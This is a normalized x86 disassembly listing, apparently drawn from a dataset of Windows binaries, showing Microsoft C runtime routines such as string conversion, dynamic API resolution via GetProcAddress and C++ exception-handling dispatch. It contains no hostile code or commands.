and eax ecx
lea ecx [ edx + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp - 0x8 ]
call sub_40f0cb
pop ecx
mov eax esi
cmp esi eax
jg r-xdata
mov edi esi
push esi
push ebx
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40f543
add esp 0x18
test eax eax
je r-xdata
cmp edx ecx
sbb eax eax
and eax ecx
push eax
call sub_419b3e
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
cmp edx ecx
sbb eax eax
and eax ecx
call sub_4297c0
mov ebx esp
test ebx ebx
je r-xdata
push eax
push [ ebp + 0x18 ]
push [ ebp - 0xc ]
push ebx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40f543
add esp 0x18
jmp r-xdata
push edi
push edi
cmp [ ebp + 0x1c ] edi
jne r-xdata
mov [ ebx ] 0xdddd
mov [ ebx ] 0xcccc
jmp r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
jmp r-xdata
push edi
push edi
test ebx ebx
je r-xdata
add ebx 0x8
jmp r-xdata
push esi
push ebx
push edi
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
push ebx
call sub_40f0cb
pop ecx
push ebx
call sub_40f0cb
pop ecx
jmp r-xdata
sub_40f0cb
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_41a3a5
pop ecx
sub_40f0e9
push esi
push r--data
call [ GetModuleHandleW@IAT ]
mov esi eax
push r--data
push esi
call [ GetProcAddress@IAT ]
xor eax [ rw-data ]
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
xor eax [ rw-data ]
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
xor eax [ rw-data ]
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
xor eax [ rw-data ]
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
xor eax [ rw-data ]
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
xor eax [ rw-data ]
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
xor eax [ rw-data ]
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
xor eax [ rw-data ]
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
xor eax [ rw-data ]
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
xor eax [ rw-data ]
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
xor eax [ rw-data ]
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
xor eax [ rw-data ]
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
xor eax [ rw-data ]
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
xor eax [ rw-data ]
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
xor eax [ rw-data ]
push r--data
mov [ rw-data ] eax
push esi
call [ GetProcAddress@IAT ]
xor eax [ rw-data ]
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
xor eax [ rw-data ]
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
xor eax [ rw-data ]
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
xor eax [ rw-data ]
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
xor eax [ rw-data ]
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
xor eax [ rw-data ]
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
xor eax [ rw-data ]
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
xor eax [ rw-data ]
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
xor eax [ rw-data ]
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
xor eax [ rw-data ]
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
xor eax [ rw-data ]
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
xor eax [ rw-data ]
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
xor eax [ rw-data ]
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
xor eax [ rw-data ]
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
xor eax [ rw-data ]
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
xor eax [ rw-data ]
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
xor eax [ rw-data ]
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
xor eax [ rw-data ]
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
xor eax [ rw-data ]
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
xor eax [ rw-data ]
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
xor eax [ rw-data ]
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
xor eax [ rw-data ]
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
xor eax [ rw-data ]
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
xor eax [ rw-data ]
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
xor eax [ rw-data ]
mov [ rw-data ] eax
xor eax eax
pop esi
retn
sub_40f493
push ebp
mov ebp esp
push esi
mov esi [ rw-data ]
xor esi [ rw-data ]
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ InitializeCriticalSectionAndSpinCount@IAT ]
xor eax eax
inc eax
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call j_sub_401f50
call esi
jmp r-xdata
pop esi
pop ebp
retn
sub_40f4cb
push ebp
mov ebp esp
push ebx
push esi
push edi
xor edi edi
mov ebx 0xe3
mov eax [ esi * 8 + r--data ]
jns r-xdata
lea edi [ esi + 0x1 ]
lea ebx [ esi - 0x1 ]
jmp r-xdata
lea eax [ ebx + edi ]
cdq
sub eax edx
mov esi eax
sar esi 0x1
push 0x55
push [ esi * 8 + r--data ]
push [ ebp + 0x8 ]
call sub_40f599
add esp 0xc
test eax eax
je r-xdata
or eax 0xffffffff
jmp r-xdata
cmp edi ebx
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40f519
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call sub_40f4cb
pop ecx
test eax eax
js r-xdata
cmp eax 0xe4
jae r-xdata
mov eax [ eax * 8 + r--data ]
pop ebp
retn
sub_40f543
push ebp
mov ebp esp
push esi
mov esi [ rw-data ]
xor esi [ rw-data ]
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40f519
pop ecx
push eax
call [ LCMapStringW@IAT ]
xor eax eax
mov ecx esi
push eax
push eax
push eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call j_sub_401f50
call esi
jmp r-xdata
pop esi
pop ebp
retn
sub_40f599
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x10 ]
xor eax eax
test esi esi
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0xc ]
push ebx
push edi
mov edi [ ebp + 0x8 ]
push 0x41
pop ebx
push 0x5a
pop edx
sub edi ecx
mov [ ebp - 0x4 ] edx
jmp r-xdata
movzx eax [ edi + ecx ]
cmp ax bx
jb r-xdata
mov edx eax
cmp ax dx
ja r-xdata
add ecx 0x2
sub esi 0x1
je r-xdata
cmp ax [ ebp - 0x4 ]
ja r-xdata
add eax 0x20
movzx edx ax
jmp r-xdata
movzx ecx ax
movzx eax dx
pop edi
sub eax ecx
pop ebx
test dx dx
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ ecx ]
cmp ax bx
jb r-xdata
cmp dx ax
je r-xdata
push 0x5a
pop edx
sub_40f60c
push 0x8
push r--data
call sub_40e2a0
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
call sub_40e2e6
retn
cmp [ eax ] 0xe06d7363
jne r-xdata
cmp [ eax + 0x10 ] 0x3
jne r-xdata
cmp [ eax + 0x14 ] 0x19930520
je r-xdata
mov ecx [ eax + 0x1c ]
test ecx ecx
je r-xdata
cmp [ eax + 0x14 ] 0x19930521
je r-xdata
mov edx [ ecx + 0x4 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x19930522
jne r-xdata
test [ ecx ] 0x10
je r-xdata
and [ ebp - 0x4 ] 0x0
push edx
push [ eax + 0x18 ]
call sub_40fee5
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
mov eax [ eax + 0x18 ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ecx
mov esi [ eax + 0x8 ]
mov ecx esi
call j_sub_401f50
call esi
sub_40f6d3
push 0x38
push r--data
call sub_40e2a0
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x1c ] eax
and [ ebp - 0x3c ] 0x0
mov ebx [ ebp + 0xc ]
mov eax [ ebx - 0x4 ]
mov [ ebp - 0x2c ] eax
mov edi [ ebp + 0x8 ]
push [ edi + 0x18 ]
lea eax [ ebp - 0x48 ]
push eax
call sub_411633
pop ecx
pop ecx
mov [ ebp - 0x30 ] eax
call sub_4134cc
mov eax [ eax + 0x10 ]
mov [ ebp - 0x34 ] eax
call sub_4134cc
mov eax [ eax + 0x14 ]
mov [ ebp - 0x38 ] eax
call sub_4134cc
mov [ eax + 0x10 ] edi
call sub_4134cc
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x14 ] ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push ebx
call sub_4113c6
add esp 0x14
mov [ ebp - 0x1c ] eax
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x40 ] 0x0
call sub_40f80e
mov eax ebx
call sub_40e2e6
retn
sub_40f767
mov esp [ ebp - 0x18 ]
call sub_4134cc
and [ eax + 0x20 ] 0x0
mov edx [ ebp + 0x14 ]
mov ebx [ ebp + 0xc ]
cmp [ edx + 0x4 ] 0x80
jg r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ ebx + 0x8 ]
jmp r-xdata
push eax
push edx
push 0x0
push ebx
call sub_41011a
add esp 0x10
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x4 ] 0x0
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x40 ] 0x0
call sub_40f80e
mov eax ebx
call sub_40e2e6
retn
imul ebx ecx 0x14
mov [ ebp - 0x24 ] ebx
cmp eax [ ebx + edi + 0x4 ]
mov ebx [ ebp + 0xc ]
jle r-xdata
mov [ ebp - 0x20 ] eax
mov edi [ edx + 0x10 ]
xor ecx ecx
mov [ ebp - 0x28 ] ecx
cmp [ edx + 0xc ] ecx
jbe r-xdata
inc ecx
mov [ ebp - 0x28 ] ecx
cmp ecx [ edx + 0xc ]
jb r-xdata
mov ebx [ ebp - 0x24 ]
cmp eax [ ebx + edi + 0x8 ]
mov ebx [ ebp + 0xc ]
jg r-xdata
imul eax ecx 0x14
mov eax [ eax + edi + 0x4 ]
inc eax
mov [ ebp - 0x20 ] eax
mov ecx [ edx + 0x8 ]
mov eax [ ecx + eax * 8 ]
mov [ ebp - 0x20 ] eax
jmp r-xdata
sub_40f80e
mov eax [ ebp - 0x2c ]
mov [ ebx - 0x4 ] eax
push [ ebp - 0x30 ]
call sub_411657
pop ecx
call sub_4134cc
mov ecx [ ebp - 0x34 ]
mov [ eax + 0x10 ] ecx
call sub_4134cc
mov ecx [ ebp - 0x38 ]
mov [ eax + 0x14 ] ecx
cmp [ edi ] 0xe06d7363
jne r-xdata
mov ebx [ ebp - 0x1c ]
cmp [ edi + 0x10 ] 0x3
jne r-xdata
cmp [ edi + 0x14 ] 0x19930520
je r-xdata
mov ebx [ ebp - 0x1c ]
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
cmp [ edi + 0x14 ] 0x19930521
je r-xdata
retn
test ebx ebx
je r-xdata
cmp [ edi + 0x14 ] 0x19930522
jne r-xdata
push [ edi + 0x18 ]
call sub_4116a1
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x40 ] 0x0
setne al
movzx eax al
push eax
push edi
call sub_40f60c
pop ecx
pop ecx
jmp r-xdata
sub_40f8c9
push ebp
mov ebp esp
cmp [ ebp + 0x20 ] 0x0
push edi
mov edi [ ebp + 0xc ]
je r-xdata
cmp [ ebp + 0x2c ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push edi
push [ ebp + 0x8 ]
call sub_40ff11
add esp 0x10
push [ ebp + 0x2c ]
push edi
jmp r-xdata
pop edi
pop ebp
retn
push edi
push eax
call sub_41157b
call sub_4115ad
push esi
mov esi [ ebp + 0x24 ]
push [ esi ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push edi
call sub_41011a
mov eax [ esi + 0x4 ]
inc eax
push 0x100
push [ ebp + 0x28 ]
mov [ edi + 0x8 ] eax
mov eax [ ebp + 0x1c ]
push [ eax + 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_40f6d3
add esp 0x2c
pop esi
test eax eax
je r-xdata
sub_40f944
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
cmp [ eax + 0x14 ] 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x19930521
je r-xdata
call sub_4134cc
xor ecx ecx
inc ecx
mov [ eax + 0x20 ] ecx
mov eax ecx
pop ebp
retn
cmp [ eax + 0x14 ] 0x19930522
jne r-xdata
sub_40f98e
push ebp
mov ebp esp
sub esp 0x44
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edi [ ebp + 0x18 ]
mov [ ebp - 0x24 ] 0x0
mov [ ebp - 0x1 ] 0x0
cmp [ edi + 0x4 ] 0x80
jg r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ ebx + 0x8 ]
jmp r-xdata
call sub_4190e7
cmp eax [ edi + 0x4 ]
jge r-xdata
mov [ ebp - 0x8 ] eax
cmp eax 0xffffffff
jl r-xdata
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0xe06d7363
jne r-xdata
mov ecx [ ebp + 0x10 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
call sub_4134cc
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0xc ] ecx
jmp r-xdata
cmp [ esi + 0x14 ] 0x19930520
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push eax
push edi
push [ ebp + 0x14 ]
push ecx
push ebx
push esi
call sub_40fcef
add esp 0x20
cmp [ esi ] 0xe06d7363
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp [ esi + 0x14 ] 0x19930521
je r-xdata
cmp [ edi + 0xc ] 0x0
jbe r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
call sub_4134cc
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ esi + 0x14 ] 0x19930522
jne r-xdata
cmp [ esi + 0x14 ] 0x19930520
je r-xdata
call sub_4134cc
mov esi [ eax + 0x10 ]
call sub_4134cc
mov [ ebp - 0x24 ] 0x1
mov eax [ eax + 0x14 ]
mov [ ebp - 0xc ] eax
test esi esi
je r-xdata
cmp [ edi + 0xc ] 0x0
jbe r-xdata
cmp [ esi + 0x14 ] 0x19930521
je r-xdata
cmp [ esi ] 0xe06d7363
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ ebp - 0x14 ]
push ecx
push eax
push [ ebp + 0x20 ]
push edi
call sub_411503
mov edx [ ebp - 0x14 ]
add esp 0x14
cmp edx [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x14 ] 0x19930522
jne r-xdata
call sub_4134cc
cmp [ eax + 0x1c ] 0x0
je r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
push esi
call sub_40f60c
pop ecx
pop ecx
lea ecx [ eax + 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x20 ] ecx
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4134cc
mov eax [ eax + 0x1c ]
mov [ ebp - 0x20 ] eax
call sub_4134cc
push [ ebp - 0x20 ]
push esi
and [ eax + 0x1c ] 0x0
call sub_40fe0a
pop ecx
pop ecx
test al al
jne r-xdata
cmp [ esi + 0x14 ] 0x19930520
je r-xdata
mov eax [ edi ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
inc edx
add ecx 0x14
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x20 ] ecx
cmp edx [ ebp - 0x2c ]
jb r-xdata
cmp eax [ ecx - 0xc ]
jg r-xdata
push [ ebp - 0x20 ]
call sub_40fea6
pop ecx
test al al
je r-xdata
cmp [ esi + 0x1c ] 0x0
je r-xdata
cmp [ esi + 0x14 ] 0x19930521
je r-xdata
cmp [ edi + 0x1c ] 0x0
jne r-xdata
lea edi [ ecx - 0x10 ]
mov [ ebp - 0x38 ] edi
mov edi [ ebp + 0x18 ]
cmp [ ecx - 0x10 ] eax
jg r-xdata
mov ebx [ ecx ]
mov [ ebp - 0x10 ] ebx
mov ebx [ ecx - 0x4 ]
test ebx ebx
mov [ ebp - 0x18 ] ebx
mov ebx [ ebp + 0xc ]
jle r-xdata
jmp r-xdata
cmp [ esi + 0x14 ] 0x19930522
jne r-xdata
test [ edi + 0x20 ] 0x4
jne r-xdata
test [ edi + 0x20 ] 0x4
je r-xdata
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
mov ecx [ eax ]
lea edx [ eax + 0x4 ]
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] edx
push 0x1
push esi
call sub_40f60c
pop ecx
pop ecx
lea ecx [ ebp - 0x44 ]
call sub_40f6bb
push r--data
lea eax [ ebp - 0x44 ]
push eax
call sub_4111b8
push [ edi + 0x1c ]
push esi
call sub_40fe0a
pop ecx
pop ecx
test al al
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
add [ ebp - 0x10 ] 0x10
dec eax
mov [ ebp - 0x18 ] eax
test eax eax
jle r-xdata
push [ esi + 0x1c ]
push [ edx ]
push [ ebp - 0x10 ]
call sub_4102de
add esp 0xc
test eax eax
jne r-xdata
call sub_4134cc
call sub_4134cc
call sub_4134cc
mov [ eax + 0x10 ] esi
call sub_4134cc
cmp [ ebp + 0x24 ] 0x0
mov ecx [ ebp - 0xc ]
push esi
mov [ eax + 0x14 ] ecx
jne r-xdata
mov edx [ ebp - 0x14 ]
mov ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x34 ]
jmp r-xdata
push [ ebp - 0x24 ]
mov eax [ ebp - 0x1c ]
push [ ebp + 0x24 ]
mov [ ebp - 0x1 ] 0x1
push [ ebp + 0x20 ]
push [ ebp - 0x38 ]
push [ eax ]
push [ ebp - 0x10 ]
push edi
push [ ebp + 0x14 ]
push [ ebp - 0xc ]
push ebx
push esi
call sub_40f8c9
add esp 0x2c
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x1c ]
dec eax
add edx 0x4
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x1c ] edx
test eax eax
jg r-xdata
push [ ebp + 0x24 ]
push ebx
jmp r-xdata
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x28 ] ecx
test ecx ecx
jle r-xdata
mov eax [ ebp - 0x18 ]
call sub_4115ad
push 0xffffffff
push edi
push [ ebp + 0x14 ]
push ebx
call sub_41011a
add esp 0x10
push [ edi + 0x1c ]
call sub_40f88f
sub_40fcef
push ebp
mov ebp esp
push ecx
push ecx
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi ] 0x80000003
je r-xdata
pop edi
mov esp ebp
pop ebp
retn
push ebx
push esi
call sub_4134cc
mov ebx [ ebp + 0x18 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
push 0x0
call [ EncodePointer@IAT ]
mov esi eax
call sub_4134cc
cmp [ eax + 0x8 ] esi
je r-xdata
call sub_4190e7
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x1c ]
push [ ebp + 0x20 ]
push ebx
call sub_411503
mov ecx [ ebp - 0x8 ]
add esp 0x14
mov edx [ ebp - 0x4 ]
cmp ecx edx
jae r-xdata
cmp [ edi ] 0xe0434f4d
je r-xdata
pop esi
pop ebx
lea esi [ eax + 0xc ]
mov eax [ ebp + 0x1c ]
cmp [ edi ] 0xe0434352
je r-xdata
inc ecx
add esi 0x14
mov [ ebp - 0x8 ] ecx
cmp ecx edx
jb r-xdata
cmp eax [ esi - 0x8 ]
jg r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_411426
add esp 0x1c
test eax eax
jne r-xdata
cmp eax [ esi - 0xc ]
jl r-xdata
mov eax [ esi ]
mov edi [ esi + 0x4 ]
shl eax 0x4
mov edi [ edi + eax - 0xc ]
test edi edi
je r-xdata
mov edi [ esi + 0x4 ]
add edi 0xfffffff0
add eax edi
mov edi [ ebp + 0x8 ]
test [ eax ] 0x40
jne r-xdata
mov edx [ esi + 0x4 ]
mov ebx [ edx + eax - 0xc ]
mov edx [ ebp - 0x4 ]
cmp [ ebx + 0x8 ] 0x0
mov ebx [ ebp + 0x18 ]
jne r-xdata
mov eax [ ebp + 0x1c ]
push 0x1
push [ ebp + 0x24 ]
lea ecx [ esi - 0xc ]
push [ ebp + 0x20 ]
push ecx
push 0x0
push eax
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_40f8c9
mov edx [ ebp - 0x4 ]
add esp 0x2c
mov ecx [ ebp - 0x8 ]
sub_40fe0a
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
test esi esi
je r-xdata
call sub_4190e7
mov edi [ esi ]
xor ebx ebx
test edi edi
jle r-xdata
pop edi
pop esi
mov al bl
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov [ ebp - 0x4 ] ebx
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
mov ecx [ eax ]
add eax 0x4
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
add edx 0x10
mov [ ebp - 0x4 ] edx
sub edi 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
add eax edx
mov [ ebp - 0x14 ] eax
mov ecx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
test eax eax
jle r-xdata
mov bl 0x1
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
dec eax
add ecx 0x4
mov [ ebp - 0x8 ] eax
test eax eax
mov [ ebp - 0xc ] ecx
mov eax [ ebp - 0x14 ]
jg r-xdata
mov edx [ ebp + 0x8 ]
push [ edx + 0x1c ]
push [ ecx ]
push eax
call sub_4102de
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x4 ]
sub_40fea6
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
cmp [ edi ] esi
jle r-xdata
xor al al
mov ebx esi
mov al 0x1
jmp r-xdata
inc esi
add ebx 0x10
cmp esi [ edi ]
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi + 0x4 ]
push rw-data
mov eax [ ebx + eax + 0x4 ]
add eax 0x4
push eax
call sub_41138a
pop ecx
pop ecx
test eax eax
je r-xdata
sub_40feec
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push esi
mov eax [ ecx ]
mov esi [ ecx + 0x4 ]
add eax edx
test esi esi
js r-xdata
pop esi
pop ebp
retn
mov ecx [ ecx + 0x8 ]
mov edx [ esi + edx ]
mov ecx [ edx + ecx ]
add ecx esi
add eax ecx
sub_40ff11
push 0x8
push r--data
call sub_40e2a0
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
test [ edx ] 0x80000000
je r-xdata
lea edi [ ecx + 0xc ]
add edi [ edx + 0x8 ]
mov edi ecx
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_40feec
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_40fee5
sub eax 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x14 ]
push esi
push edx
push ecx
mov ebx [ ebp + 0x8 ]
push ebx
call sub_40ffa3
add esp 0x10
sub eax 0x1
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40e2e6
retn
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_40feec
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_40fee5
jmp r-xdata
sub_40ffa3
push 0x10
push r--data
call sub_40e2a0
xor ebx ebx
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ ecx + 0x8 ] bl
je r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
mov ecx [ eax ]
mov esi [ ebp + 0xc ]
test ecx ecx
js r-xdata
test [ eax ] 0x80000000
je r-xdata
mov [ ebp - 0x4 ] ebx
mov edi [ ebp + 0x14 ]
test cl cl
jns r-xdata
add esi 0xc
add esi edx
mov eax [ ebp + 0x8 ]
test cl 0x8
je r-xdata
test [ edi ] 0x10
je r-xdata
test [ edi ] 0x1
je r-xdata
mov ecx [ eax + 0x18 ]
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
cmp [ edi + 0x18 ] ebx
jne r-xdata
cmp [ eax + 0x18 ] 0x0
je r-xdata
call sub_4190e7
test esi esi
je r-xdata
mov ecx eax
call j_sub_401f50
call [ ebp - 0x1c ]
mov ecx eax
jmp r-xdata
cmp [ eax + 0x18 ] ebx
je r-xdata
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
test esi esi
je r-xdata
mov [ esi ] ecx
lea eax [ edi + 0x8 ]
push eax
push ecx
jmp r-xdata
test ecx ecx
je r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
push [ edi + 0x14 ]
push [ eax + 0x18 ]
push esi
call sub_410380
add esp 0xc
cmp [ edi + 0x14 ] 0x4
jne r-xdata
call sub_40feec
pop ecx
pop ecx
mov [ esi ] eax
jmp r-xdata
test [ edi ] 0x4
push 0x0
pop ebx
setne bl
inc ebx
mov [ ebp - 0x20 ] ebx
push [ edi + 0x14 ]
lea eax [ edi + 0x8 ]
push eax
push ecx
call sub_40feec
pop ecx
pop ecx
push eax
push esi
call sub_410380
add esp 0xc
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax ebx
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
call sub_40e2e6
retn
lea eax [ edi + 0x8 ]
push eax
push [ esi ]
sub_4100d5
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe0434352
je r-xdata
call sub_4134cc
cmp [ eax + 0x18 ] 0x0
jle r-xdata
cmp [ eax ] 0xe0434f4d
je r-xdata
xor eax eax
pop ebp
retn
call sub_4134cc
dec [ eax + 0x18 ]
cmp [ eax ] 0xe06d7363
jne r-xdata
call sub_4134cc
and [ eax + 0x18 ] 0x0
jmp sub_4190e7
sub_41011a
push 0x10
push r--data
call sub_40e2a0
mov eax [ ebp + 0x10 ]
cmp [ eax + 0x4 ] 0x80
mov eax [ ebp + 0x8 ]
jg r-xdata
mov esi [ eax + 0x8 ]
